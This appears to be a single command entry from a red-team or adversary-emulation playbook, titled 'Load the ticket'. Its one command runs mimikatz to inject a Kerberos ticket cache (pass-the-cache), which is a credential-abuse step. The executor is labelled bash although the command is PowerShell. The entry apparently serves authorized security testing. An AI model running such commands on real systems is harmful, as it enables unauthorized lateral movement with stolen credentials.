---
id: 50d2c6bb-fbb8-475e-8995-288c3ddb7a06
name: Load the ticket
type: command
executor: bash
data: .\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
output: null
created_at: '2023-04-06T03:56:07.952268+00:00'
updated_at: '2023-04-10T20:26:20.679788+00:00'
---

# Load the ticket

```bash
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
```
